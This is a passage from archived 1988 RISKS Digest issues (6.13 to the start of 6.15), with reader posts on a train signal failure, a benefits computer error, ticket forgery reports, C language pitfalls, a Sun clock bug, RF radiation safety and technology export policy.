</address>
<i>
Sun 24 Jan 88 14:28:53-PST
</i><PRE>

PICO RIVERA, Los Angeles County (AP, 24 Jan 88)

A malfunctioning signal light appeared to have caused a freight train to crash
into a parked train, killing a man and igniting a fire that consumed a church
and a store, a railroad official said Saturday.  A 72-car freight train
traveling about 40 mph to 45 mph slammed into a parked 67-car freight train
at 10:30 p.m. Friday after a signal light about a mile from the impact gave 
the green go-ahead light, an official said.  Damage to the trains and
buildings was estimated at $2.3 million.

  [From the San Francisco Sunday Examiner and Chronicle.  The identical story
  appeared TWICE in the same issue on 24 January 1988 -- on page B-5 and also
  on page B-7, although with different headlines.  The headline guy must have
  been napping, or else the story was intended to illustrate the importance of
  redundancy.  PGN]

  [Ironically, the Federal Communcations Commission recently approved plans
  for a nationwide computerized train-control system -- inspired by the
  collision on 4 January 1987 of three speeding Conrail locomotives and an
  Amtrak passenger train, klling 16 and injuring 176 near Chase, MD, with
  losses estimated at over $40 million.  The FCC's private radio bureau
  reported that "This terrible collision could have been avoided had the
  locomotives been under the control of a central computer."  This popular
  view assumes that such computer systems always work correctly, and that
  people always program them correctly.  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Big Error on Benefits by a State Computer
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:NEUMANN@csl.sri.com">
NEUMANN@csl.sri.com
</A>&gt;
</address>
<i>
Sun 24 Jan 88 14:15:34-PST
</i><PRE>

By Perry Lang, San Francisco Chronicle, 21 January 1988.

"Thousands of Californians have been charged for unemployment and disability
insurance benefits they never received because of a computer snafu in
Sacramento.  One of the state's computers, which tallied ... benefits for 1987,
malfunctioned and moved the decimal place two spaces to the right -- producing
dollar amounts that were up to 100 times more than they should have been. ...
[A]bout 60,000 people throughout the state received erroneous statements."

   [Computer malfunction? or program error? or human error on input?  PGN]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
London Underground Ticket Machine fraud
</A>
</H3>
<address>
John Pettitt
&lt;<A HREF="mailto:jpp@slxsys.specialix.co.uk ">
jpp@slxsys.specialix.co.uk 
</A>&gt;
</address>
<i>
Mon Jan 18 13:50:11 1988
</i><PRE>
Organization: Specialix International, London, UK.

Reproduced without permission from "datalink" monday 11 jan 1988

London Underground's controversioal UKL 150 million computerised ticket
system could create a fare dodgers' paradise. ...  The system, based on
sophisticated real time software developed by Logica, has been criticised
because it allows adults to purchase child tickets and travel on the
Undergroud without being visualy checked by ticket collectors. ... Now
security consultants have confirmed that the new type of ticket, which uses
a magnetic strip holding details of the fare, will be easier to forge that
the traditional printed type.

John Maxfield, and anti-hacking consultant in Detroit, says similar tickets
have already been beaten by teenagers in the US.  He said:  "San Francisco
metro caught a gang forging the tickets there last January.  The gang had
used pasteboard and cassette tape to make duplicates."

A spokesman for Westinghouse Cubic, which manuafctures the new ticket
barriers, at first denied its system had been breached in the US.  But a
spokesman later admited:  "With the right know-how, of course anything in
the world can be duplicated, including our tickets."

Can any US readers of comp.risks add any further info on the SF incident ?

John Pettitt, Specialix, Giggs Hill Rd, Thames Ditton, Surrey, England, KT7 0TR
{backbone}!mcvax!ukc!pyrltd!slxsys!jpp               jpp@slxsys.specialix.co.uk
Tel: +44-1-398-9422         Fax: +44-1-398-7122          Telex: 918110 SPECIX G

    [Considering how easy this is to do in SF's BART and in DC's METRO, we 
    might just as well NOT discuss it here.  But the vulnerability -- a 
    playback copycat attack -- has been well known for many years.  PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
The responsibility of and for `bringing us C and Unix'
</A>
</H3>
<address>
Geraint Jones 
&lt;<A HREF="mailto:geraint%prg.oxford.ac.uk@NSS.Cs.Ucl.AC.UK">
geraint%prg.oxford.ac.uk@NSS.Cs.Ucl.AC.UK
</A>&gt;
</address>
<i>
Sat, Jan 23 15:15:10 1988 GMT
</i><PRE>

I take issue with some of Peter Neumann's editorial comment (RISKS 6.11,
after the continuing discussion of Sun clock problems traced to mishandled
side-effects in C expressions).  I accept that the programmer was at fault,
that we should always be aware that we are at risk of being allowed to make
mistakes; but `the people who brought us C and Unix' _do_ share the fault.

    UNIX is moderately wonderful; because of that, you will scarcely find a
convenient and powerful desktop computer which does not use UNIX, and I for
one would not choose to use one.  Choose UNIX, and you get C; and that's the
fault of all `the people who brought us C and Unix', including the few
individuals who had the good (and just one or two bad) ideas in the first
place, all the universities and companies who have popularised and modified
UNIX, and those of us who use it.

    C was a pretty neat idea when you compare it with what else was about
fifteen years ago, and without it UNIX could not have been knocked up as it
was.  The technology exists, and has existed for years, to check that the
arguments of a function are side-effect free.  Ten years ago, I used a BCPL
compiler that would decide whether or not it was safe to call arguments to
`macros' (manifest functions) by substitution.  Where are the C compilers that
check for such things?  I write C programs only because `the market' has
created a near monopoly in portable programs in the community in which I work.

    The C macro-substitution mechanism cries out to be misused, and we
_should_ kick up a fuss about it.  Such things should not be allowed to
continue.  Peter Neumann reminds us to ``Know your requirements before you
start designing, programming, or simply using a computer system.'' Well, I
do; I want to write programs which correctly implement the algorithms I
design.  I want the software tools that I use to make it as difficult as
possible for me to make a fool of myself; yes, even at the expense of making
it harder to write programs. Now, where do I get them?               gj

    [RISKS are in the eye of the beholder.  ALL COMPUTING entails certain
    risks.  If you want perfectly safe programming languages and operating
    systems, you would be most unhappy with the constraints.  The only
    program you could write would be THE NULL PROGRAM, and even that would not
    be safe if nonstop real-time positive control were required.  On one hand 
    we have people who will tell us that they can produce 10 million lines of
    code that will work adequately without system testing.  On the other hand
    we have systems and languages that hinder any such efforts.  Ultimately we
    need truly gifted programmers.  Ken Thompson is one.  But there probably
    aren't more than a handful anywhere approximating him in the country.
    Besides, people that creative would be badly matched to the task of trying
    to write 10 million lines of code.  Creativity often is best exercised when
    the results are not what was expected.

    You might look at Modula 2 and C++.  But don't expect fool-proof operating
    systems.  There aren't any.  By the way, we should not trust any programs
    developed by fools -- even with perfect tools.  PGN]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
 Technology transfer policy and Halley's Comet probe (<A HREF="/Risks/6.12.html">RISKS-6.12</A>)
</A>
</H3>
<address>
Alex Colvin 
&lt;<A HREF="mailto:mac3n@babbage.acc.virginia.edu">
mac3n@babbage.acc.virginia.edu
</A>&gt;
</address>
<i>
Sat, 23 Jan 88 14:22:06 EST
</i><PRE>

In regard to the discussion of technology transfer policy:  Scientific
American noted that on the Soviet Halley's Comet probe the only experiment
not controlled by a microprocessor was an American contribution.

                       [I presume you are implying that this is a RISK.  
                       It might even be a BLESSING IN D' SKIES?  PGN]

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
 Non-ionizing radiation
</A>
</H3>
<address>
    John Nowack KA9EYT 
&lt;<A HREF="mailto:MISS042%ECNCDC.BITNET@CUNYVM.CUNY.EDU">
MISS042%ECNCDC.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Fri 08 Jan 1988 17:20 CDT
</i><PRE>

When I read the study about non-ionizing radiation, I seemed to remember an
article in a similar vein, and about an hour at the library dug it up.  It's
actually a series of articles published in QST, the technical magizine of
the American Radio Relay League.  The following comes from QST, Vol. LXII,
No. 9, September 1978, p. 31.  For more information on this same subject see
QST Vol. LXII, No. 6, June 1978, pp. 11-13, and for more info on the risks
of chemical exposure see part 2 of that article in No. 7, July, 1978,
pp. 37-38.  Most towns with an active ham population will have a club that
will more than likely have given a subscription to this publication to a
local public or university library.

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
John Nowack -- KA9EYT (aka The Black Knight)
(A member of the Society for the Prevention of Injustice to Tuna (S.P.I.T.))

MISS042@ECNCDC.BITNET &gt;&gt;======&gt; Western Illinois University (A Member of
                                   the Mid-Illinois Computer Coopertive;
                                   Educational Computing Network)

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=%&lt; cut here -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
The following disclaimer heads the article:
The publishers of QST assume no reponsibility for statements made by
correspondents.

                 How Dangerous is RF Radiation?
                      by: J. E. Kearmen, W1XZ
                          RFD, Collinsville, CT
                               06022

Workers at Motorola have recently conducted experiments of great interest to
most amateurs.  Their results have been published in several IEEE publications
(see end for info).  I'm grateful to Mr. Ronald Brecher, WA2EUN, who supplied
a copy of the March, 1977 document.
  The experimenters constructed a simulated human head and torso and exposed
it to the radiated fields from 150 and 160 MHz, 6 watt handheld transceivers.
Both radios were equipped with helical, or "rubber duck" antennas.  In
addition, tests were performed with a 1/4 wavelength antenna installed on the
450 MHz unit.  A thermal probe was used to measure temperature rise due to
exposure.  These experiments were performed because of a concern that the
newer, high-power units might pose a health hazard.  Previous measurments of
the field strength surrounding these radios had indicated that a field
intensity exceeding 10 mW/cm2 might exist.  This is a safety standard for human
exposure to RF energy at higher frequencies.
  Beacause the field would be concentrated by a probe causing nontypical,
localized heating, the probes were removed while the transmitter was operating.
The "dummy" was exposed for from 15 to 60 seconds.  After power was removed,
the probe was again inserted and the temperature change was determined.  Steps
were taken to prevent thermal transients caused by the insertion and removal
of the probe.  It would have been possible for heating to occur in small
areas not being monitored by a probe. To look for "hot spots", an IR
(infrared) scanner was used to take thermograms of the dummy.
  Assuming the transceiver was positioned as it would be during normal
operation, no significant heating effects were noticed on either band. Even at
450 MHz, the temperature rise was slight.  At a shallow probe depth (0.2 in.
or 5 mm), the greatest temperature rise was less than 1 degree C.  (Actually
10 degree C, at the eyebrows - jcn) At deeper probe penetrations, the
temperature rise was less.  Attempting to determine possible hazards from a
measurement of radiated field intensity may cause misleading results.  The
low total energy and high field impeadence which exist when such radios are
brought in close proximity to the body will result in lower energy transfer
than field strength measurements alone would seem to indicate.  For example,
at a point two inches (50 mm) from the helical antenna of the 150 MHz
transmitter (Fig 1 (a good drawing of the measured temperatures -jcn)), a
Narda field probe measured a maximum field intensity of 168 mW/cm2.  This
value greatly exceeds the 10 mW/cm2 exposure standard.  Measurements based on
the penetrating effects at the same point indicate a maximum power flow density
in tissue of 2.8 mW/cm2.  On 450 MHz, with the same spacing from the 1/4
wavelength *whip* antenna (Fig 3), a maximum radiated intensity of 16 mW/cm2
was found.  Power-flow density was only 2.5 mW/cm2.  The radiation meter
indicates a hazardous condition, while actual measurement of the effects
shows this is not the case.  Power *absorption* in all cases was less than
1 mW/cm2.
  IR thermograms did not detect any unusual hot spots.  A health hazard
exists when the tip of the antenna is close to the eye (whithin 0.2 inch or
5 mm) and the transmitter is operated.  In this case, an rf burn will result
on the cornea.  The thick plastic cap on the tip of the antenna makes this
unlikely to occur.  When the radios are held in the normal position for use,
no hazard exists.
  While these tests were performed for 150 and 450 MHz, I think it safe to
assume we need not fear our 220 MHz rigs either.  These tests point out the
fallacy of using radiated field intensity as a criterion of saftey.  Some
consumer publications have begun to measure field strength radiated from
CB radios.  Comsumers have been warned not to stand too close to the mobile
whip while a 5-watt CB transmitter is operating, due to the high field
strength!  These papers have shown that radiated power may greatly exceed that
which is absorbed and converted into heat.  Amateurs should continue to
exercise prudence when using uhf and microwave equipment, of course.  It
does seem that our portable transceivers pose no threat to our health.

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
cancer, ham radio operators, and Poisson statistics
</A>
</H3>
<address>
&lt;<A HREF="mailto:Jonathan_Thornburg%UBC.MAILNET@um.cc.umich.edu">
Jonathan_Thornburg%UBC.MAILNET@um.cc.umich.edu
</A>&gt;
</address>
<i>
Sat, 9 Jan 88 20:21:02 PST
</i><PRE>

Perhaps I'm missing something, but the AP story quoted in Risks 6.3
about cancer death rates among ham radio operators doesn't seem to
me to show anything abnormal --- the deviations from expectation are
about what you'd expect from random fluctuations.  For example, for
the leukemia case (29 exp vs 36 obs), *chance* *fluctuations* *alone*
will cause the number of deaths to be at least 36, about 10% of the
time.  In other words, if we hypothesise that there's no excess, then
this experiment (still) has a 10% chance of seeing excesses at least
as large as those observed.
 
The other rates quoted give similar results.  The probability that
all these rates would simultaneously deviate by these amounds is
rather small, but this sort of statistical "inference" is frowned on
by the pros --- it risks a "shotgun effect" in which you check (say)
100 different types of cancer, find 5%-chance-occurence sized excesses
in 5 of them (quite unsuprisingly), then report just those 5 and say
that the chances of getting these excesses in all 5 is (5%)**5 = one
chance in 3 million.
 
Of course, the AP reporter may well have garbled things, but the data
in the story don't seem to prove (*) any excess death rates.
 
(*)     I'm using "prove" in it's normal statistical sense, ie "prove
        at a 95% or better confidence level".

</PRE>
<HR><H3><A NAME="subj8.2">
Books about SDI software
</A>
</H3>
<address>
&lt;<A HREF="mailto:DMJ%Vms.Cis.Pittsburgh.Edu@VB.CC.CMU.EDU">
DMJ%Vms.Cis.Pittsburgh.Edu@VB.CC.CMU.EDU
</A>&gt;
</address>
<i>
Thu, 21 Jan 88 22:07 EDT
</i><PRE>

I am going to be writing a report on the feasibility of the software for SDI.
Have any RISKS readers seen any good books or articles on the subject?  If so,
would you mind mailing me a reference, and maybe a few sentence abstract.  I
will post a complete list if anyone is interested.  Thanks in advance.
								
Dan Jones, dmj3@cisunx.uucp, dmj3%unix.cis.pittsburgh.edu@ub.cc.cmu.edu

   [RESPONSES TO Dan, PLEASE.  Completed list from Dan to RISKS, please... PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.12.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.14.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-50</DOCNO>
<DOCOLDNO>IA012-000130-B023-430</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.14.html 128.240.150.127 19970217015254 text/html 13814
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:51:23 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 14</TITLE>
<LINK REL="Prev" HREF="/Risks/6.13.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.15.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.13.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.15.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 14</H1>
<H2> Monday, 25 January 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Safe programming languages 
</A>
<DD>
<A HREF="#subj1.1">
Bob Estell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  More about the technology transfer policy 
</A>
<DD>
<A HREF="#subj2.1">
Paul Smee
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  A second Sun clock error: no sanity checking 
</A>
<DD>
<A HREF="#subj3.1">
John Bruner
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  "Things That Go 'Beep'"  
</A>
<DD>
<A HREF="#subj4.1">
Paul Fuqua
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  High-voltages and Europe vs USA 
</A>
<DD>
<A HREF="#subj5.1">
Kee Hinckley
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  I know why Ham Radio Operators die so often!!! (silly) 
</A>
<DD>
<A HREF="#subj6.1">
Eric Townsend
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Safe programming languages
</A>
</H3>
<address>
"CL351::ESTELL" 
&lt;<A HREF="mailto:estell%cl351.decnet@nwc.arpa">
estell%cl351.decnet@nwc.arpa
</A>&gt;
</address>
<i>
25 Jan 88 07:50:00 PDT
</i><PRE>

About a decade ago, Lawrence Flon gave us the following axiom:

 "There never has been, nor will there ever be, any programming language
  in which it is the least bit difficult to write bad code."

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
   More about the technology transfer policy
</A>
</H3>
<address>
      Paul Smee 
&lt;<A HREF="mailto:Smee@AUCC.AC.UK">
Smee@AUCC.AC.UK
</A>&gt;
</address>
<i>
Mon, 25 Jan 88 11:47 GMT
</i><PRE>

Perhaps one of the lesser-known 'features' of the US technology transfer policy
is the fact that the US government applies it internationally.  For example:

If a British firm manufactures, say, a PC-XT clone, even using 100% British
components (not likely, I'd admit, but for the sake of argument), and then
sells it to one of the proscribed countries, the British manufacturer is deemed
to have violated the US law.  This despite the fact that no British law may
have been broken.  The manufacturer is now liable to be arrested and prosecuted
if he ever visits the US in the future.  Further, in some cases, the US
government will put pressure on the British government which leads the British
government to 'blackball' the manufacturer.  Several small UK companies have
been driven under in just this way.  Now, according to last week's news
reports, the US is trying to convince the British government to extend the
extradition treaties so that these people could be extradited to the US for
prosecution.

The record of the British government in protecting its nationals in this sort
of case is appalling; typically, they will even refuse to assist in preparation
of an appeal against the US trade restriction.  So, I see every reason to fear
that they will give in to this latest idea.  And remember, the British
nationals involved can end up in this situation without doing anything illegal
under British law.  The attitude of the British government appears to be summed
up as 'well, the Americans are our friends, and we wouldn't want to offend
them'.  (Of course, we've got a different outlook on it when the other guys
impose such conditions on their 'friends'.)

There are other side effects of this US legislation.  The University of London
had a great deal of trouble getting their second Cray (despite the fact that
they had one).  The Cray was already in-country; they were buying it pre-owned
from one of the national laboratories.  The problem?  The US Department of
Commerce wanted them to sign a statement guaranteeing that only UK and US
national students and staff would be allowed to use it.  (I'm not sure what
conclusion was finally reached, but they did eventually get the machine.)  More
recently, DEC pulled out of negotiations for selling a mainframe to one of the
Scottish Universities, for similar reasons.

Can this be sensible, I ask myself.  Just for clarification, let me add that I
am a US citizen, though resident over here.  I think (and hope) that I (still)
have the right to argue against what I see as misguided policies of my
country's government.

The risk?  Well, as I see it, a very great risk that in defending us against
the enemy, the government will become as great an oppressor of freedom as (they
say) the other guys are.

Paul Smee, Senior Systems Programmer, University of Bristol
Smee at UK.AC.AUCC via UKACRL.BITNET
     at AUCC.AC.UC  iff you can find an ARPA host doing domain addressing,
                    and which does not route thru UCL
 pes!bath63!ukc!mcvax!...  on USENET (if you're lucky)

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
A second Sun clock error: no sanity checking
</A>
</H3>
<address>
John Bruner 
&lt;<A HREF="mailto:jdb@mordor.s1.gov">
jdb@mordor.s1.gov
</A>&gt;
</address>
<i>
Sun, 17 Jan 88 18:53:39 PST
</i><PRE>

The recent incident with the Sun leap-year clock problem illustrates
a RISK which noone has mentioned yet: software which blindly trusts
hardware without performing sanity checks on the data received therefrom.

There were two coding errors in the Sun clock code.  The first was the
use of a side effect in a macro argument, which caused the hardware
time of day register (TODR) to be loaded with garbage.  The second error
was the use of the contents of the TODR without any range checking.

Classically, the time in UNIX has been maintained by software in
response to interrupts from an interrupt source (line clock or
programmable timer).  This is true on the Sun as well, except that
every 30 seconds the Sun kernel also compares the software-maintained
time to the contents of the hardware TODR.  If the two values differ,
provisions are made to synchronize the software-maintained time to the
hardware TODR.  The apparent assumption here is that the TODR will be
more accurate, and usually that assumption is justified.

The system call "settimeofday" changes both the software-maintained time and
the TODR.  When the unfortunate leap-year bug manifested itself,
"settimeofday" correctly changed the software-maintained time but trashed
the TODR.  Within 30 seconds the kernel detected that the two values were
different and starting trying to "correct" the software-maintained time to
match the garbage in the TODR.  A simple range check applied to the
difference between these two values could have detected that the TODR was
trashed and suppressed this "feature."

  John Bruner (S-1 Project, Lawrence Livermore National Laboratory)
  jdb@mordor.s1.gov					(415) 423-4848

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
"Things That Go 'Beep'"
</A>
</H3>
<address>
Paul Fuqua 
&lt;<A HREF="mailto:pf%ti-csl.csc.ti.com@RELAY.CS.NET">
pf%ti-csl.csc.ti.com@RELAY.CS.NET
</A>&gt;
</address>
<i>
Mon, 25 Jan 88 14:57:38 CST
</i><PRE>

     To add another element to the discussion about risks related to normal
house wiring, the Dallas Morning News on Jan 24 printed an article about an
electric-company experiment in remote meter reading.
     Their system broadcasts a "coded electrical signal" at 12500 Hz on top
of the normal 60 Hz power to 5000 customers in the test area.  About 1000
participants have a special meter that responds to the signal by reporting
usage or, if so equipped, by turning off major appliances like air
conditioners, water heaters, or furnaces.
     The article contains all sorts of glowing comments from the utility
about cost savings and other uses for the equipment (fire alarms, for
example).  The focus of the article, though, is on one family that, although
not participating in the experiment, can *hear* the signal as an intermittent
one-second beep, and it's driving them crazy.

     RISKS relevance:  First, it's a computerised system, and we all know
what hazards there are -- I, for one, don't want my heating and cooling
subject to the utility's direct orders.
     Second, around 0.5% of customers in test areas around the country have
complained about the noises.  Westinghouse (the manufacturer) is considering
increasing the signal frequency to 19000 Hz.  Will it then annoy dogs or
hamsters?
     In closing, a quote from the article:

Despite assurances that the signals won't harm electronic equipment, he [John
Feagins, a member of the affected family and a college physics student at UT]
said he wants the signal removed to protect his computer.

"To me, that's like putting something in the water," Feagins said.  "I want
pure, clean electricity for all my electronic equipment."
                                                                pf

Paul Fuqua, Texas Instruments Computer Science Center, Dallas, Texas
CSNet:  pf@csc.ti.com or pf@ti-csl
UUCP:   {smu, texsun, im4u, rice}!ti-csl!pf

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
High-voltages and Europe vs USA
</A>
</H3>
<address>
Kee Hinckley 
&lt;<A HREF="mailto:apollo!nazgul@EDDIE.MIT.EDU">
apollo!nazgul@EDDIE.MIT.EDU
</A>&gt;
</address>
<i>
Tue, 12 Jan 88 19:02:46 EST
</i><PRE>

The European argument is clearly out, not only are most European currents not
DC, most of them are running more than 110.  However I have heard concerns
about this recently but I don't remember where.  In fact one of the issues
I've read about concerns electric blankets.  The article claimed that there
were statistically significant increases in the number of miscarriages from
women who slept under electric blankets.  On the level of risk from standard
household current there's an obvious testing problem.  Namely it's probably
impossible to find any place where there isn't any current interference and
yet all other factors remain equal.  Obviously if you live in a house without
electricity there are bound to be other factors effecting your health.  It
seems to me that you'd have to do a very long blind study involving new
houses, some built with heavy shielding, some without.
                                                              Kee Hinckley

### {mit-erl,yale,uw-beaver}!apollo!nazgul ###   (Apple ][e ProLine BBS)    ###
###      apollo!nazgul@eddie.mit.edu       ###    nazgul@pro-angmar.uucp    ###
###           nazgul@apollo.uucp           ### (617) 641-3722 300/1200/2400 ###

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
I know why Ham Radio Operators die so often!!! (silly)
</A>
</H3>
<address>
eric townsend
&lt;<A HREF="mailto:flatline!erict@uunet.UU.NET ">
flatline!erict@uunet.UU.NET 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 11 Jan 88 02:30:55 GMT
Organization: flatline in Houston(Montrose, really), Tx.

It has nothing to do with non-ionizing radiation or with building their
own equipment and the things they get exposed to.

It's very, very simple:  Have you ever watched what a Ham Op *eats*????
Yech. :-) :-)

J. Eric Townsend -&gt;uunet!nuchat!flatline!erict smail:511Parker#2,Hstn,Tx,77007

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.13.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.15.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-51</DOCNO>
<DOCOLDNO>IA012-000130-B023-442</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.15.html 128.240.150.127 19970217015325 text/html 17850
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:51:34 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 15</TITLE>
<LINK REL="Prev" HREF="/Risks/6.14.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.16.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.14.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.16.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 15</H1>
<H2> Tuesday, 26 January 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
RISKS in Cable TV? 
</A>
<DD>
<A HREF="#subj1.1">
[...]
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Re: U.S. Fears Satellites Damaged 
</A>
<DD>
<A HREF="#subj2.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  My country's misguided technology transfer policy 
</A>
<DD>
<A HREF="#subj3.1">
Geoff Goodfellow
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
